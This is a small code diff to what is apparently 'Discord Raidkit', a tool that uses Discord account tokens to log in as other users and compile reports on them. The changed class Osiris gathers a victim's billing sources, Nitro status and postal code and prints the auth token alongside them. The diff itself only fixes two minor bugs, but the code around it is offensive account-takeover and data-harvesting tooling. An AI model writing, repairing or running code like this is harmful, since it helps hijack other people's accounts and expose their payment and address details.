@@ -1,3 +1,10 @@
+"""
+Discord Raidkit v2.4.1
+the-cult-of-integral
+
+Last modified: 2023-04-24 21:08
+"""
+
 import abc
 import asyncio
 import os
@@ -131,7 +138,7 @@ class Osiris:
         
         if bool(bill_sources):
             info += f'\n\nBilling Information\n{"*"*19}\n\n'
-            for source_data in bill_sources:
+            for source_data in bill_sources.json():
                 info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}\n'
                 
                 match source_data['type']:
@@ -157,7 +164,7 @@ class Osiris:
                         info += f'[Postal Code]{" "*7}{source_data["billing_address"]["postal_code"]}\n\n'
                     case _:
                         info += 'None'
-            info += f'\n[Token]{" "*13}{self.auth}'
+            info += f'\n[Token]{" "*13}{auth_token}'
         return info
     
     def login(self, auth_token: str, action: LoginAction) -> str:
